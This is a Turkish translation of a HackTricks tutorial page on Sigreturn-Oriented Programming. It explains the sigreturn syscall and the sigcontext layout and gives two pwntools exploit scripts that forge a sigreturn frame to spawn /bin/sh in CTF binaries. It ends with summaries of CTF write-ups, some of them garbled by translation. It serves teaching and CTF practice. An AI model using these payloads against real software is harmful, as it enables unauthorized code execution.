# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

**`Sigreturn`**, öncelikle bir sinyal işleyicisinin işlemini tamamladıktan sonra temizlik yapmak için kullanılan özel bir **sistem çağrısıdır**. Sinyaller, genellikle olağanüstü bir durumun meydana geldiğini belirtmek için işletim sistemi tarafından bir programa gönderilen kesintilerdir. Bir program bir sinyal aldığında, mevcut çalışmasını geçici olarak durdurur ve sinyali bir **sinyal işleyici** ile işlemek üzere tasarlanmış özel bir işlevle ele alır.

Sinyal işleyicisi işini bitirdikten sonra, programın **önceki durumuna geri dönmesi** gerekir, sanki hiçbir şey olmamış gibi. İşte burada **`sigreturn`** devreye girer. Programı, sinyal işleyicisinden **geri dönmeye** ve sinyal işleyicisi tarafından kullanılan **yığın çerçevesini** (işlev çağrılarını ve yerel değişkenleri depolayan bellek bölümü) temizleyerek programın durumunu geri yüklemesine yardımcı olur.

İlginç olan kısım, **`sigreturn`**'un programın durumunu nasıl geri yüklediğidir: bunu yaparak, **CPU'nun tüm kayıt değerlerini yığın üzerine depolar.** Sinyal artık engellenmediğinde, **`sigreturn` bu değerleri yığından çıkarır**, etkili bir şekilde CPU'nun kayıt değerlerini sinyalin işlendiği önceki durumlarına sıfırlar. Bu, mevcut yığının en üst kısmına işaret eden yığın işaretçisi kaydını (RSP) de içerir.

{% hint style="danger" %}
Bir ROP zincirinden **`sigreturn`** sistem çağrısını çağırarak ve **yığın** içine yüklemek istediğimiz **kayıt değerlerini ekleyerek**, tüm kayıt değerlerini **kontrol etmek** ve dolayısıyla örneğin `execve` sistem çağrısını `/bin/sh` ile **çağırmak mümkündür**.
{% endhint %}

Dikkat edin, bu, diğer Ret2syscall'ları çağırmak için parametreleri kontrol etmeyi çok daha kolay hale getiren bir **Ret2syscall türü** olacaktır:

{% content-ref url="../rop-syscall-execv.md" %}
[rop-syscall-execv.md](../rop-syscall-execv.md)
{% endcontent-ref %}

Merak ediyorsanız, bu, daha sonra değerleri kurtarmak için yığında depolanan **sigcontext yapısı**'dır (şemayı [**buradan**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html) alın):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Daha iyi bir açıklama için ayrıca şuraya bakabilirsiniz:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Örnek

[**Bir örnek bulabilirsiniz burada**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) burada signeturn çağrısının ROP aracılığıyla oluşturulduğu bir örnek bulunmaktadır (rxa'ya `0xf` değerini yerleştirerek), ancak bu oradan gelen son saldırıdır:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Ayrıca [**buradan saldırıyı kontrol edin**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) burada ikili dosya zaten `sigreturn` çağırıyordu ve dolayısıyla ROP ile bunu oluşturmaya gerek yoktu:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Diğer Örnekler ve Referanslar

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* **`sigreturn`** sistem çağrısını çağıran ve ardından **yığın üzerine yazma** izni veren derlemeli bir program. Yığına bir [**ret2syscall**](../rop-syscall-execv.md) yazmak mümkündür, ardından bir **sigreturn** yapısı aracılığıyla bayrağı okumak ve bayrağın derlemeli belleğinde bulunduğu yere erişmek mümkündür.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* **`sigreturn`** sistem çağrısını çağıran ve ardından **yığın üzerine yazma** izni veren derlemeli bir program. Yığına bir [**ret2syscall**](../rop-syscall-execv.md) yazmak mümkündür, ardından bir **sigreturn** yapısı aracılığıyla (derlemeli `/bin/sh` dizesine sahiptir).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 bitlik, relro olmayan, canary olmayan, nx, pie olmayan bir program. `gets` işlevini kötüye kullanarak basit bir tampon taşması. ROP zinciri, `/bin/sh`'yi `.bss`'ye yazmak için tekrar gets çağırarak bir [**ret2syscall**](../rop-syscall-execv.md) gerçekleştirir. **`alarm`** işlevini kötüye kullanarak eax'ı `0xf` olarak ayarlayarak bir **SROP** çağrısı yapar ve bir kabuk yürütür.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 bitlik derlemeli program, relro olmayan, canary olmayan, nx, pie olmayan. Akış, yığında yazma, birkaç kaydı kontrol etme ve ardından bir sistem çağrısı yapma ve ardından `exit` çağrısını sağlar. Seçilen sistem çağrısı, registreleri ayarlayacak ve `eip`'yi önceki bir sistem çağrısı talimatını çağırmak ve `memprotect`'i çalıştırmak için ayarlayacak bir `sigreturn`'dur. Program, ESP'yi derlemeli alana ayarlamak için `rwx`'e ayarlayacak ve ESP'yi derlemeli alana ayarlayacak şekilde çalışacaktır. Akışı takip ederek, program ESP'yi tekrar okumak için çağırır, ancak bu sefer ESP bir sonraki talimatı işaret edeceğinden, bir kabuk kodu geçirerek onu bir sonraki talimat olarak yazacak ve çalıştıracaktır.
